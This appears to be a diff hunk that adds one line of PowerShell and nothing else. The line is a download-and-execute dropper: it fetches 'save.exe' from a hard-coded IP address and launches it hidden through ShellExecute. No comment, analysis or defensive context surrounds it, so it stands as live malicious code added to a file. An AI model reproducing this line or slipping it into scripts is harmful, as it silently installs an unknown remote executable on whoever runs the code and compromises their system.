@@ -1,0 +1,1 @@
+$down = New-Object System.Net.WebClient;$down.DownloadFile("http://178.170.58.9/files/save.exe", "save.exe"); $exec = New-Object -com shell.application; $file = 'save.exe'; $exec.shellexecute($file,"","","",0);
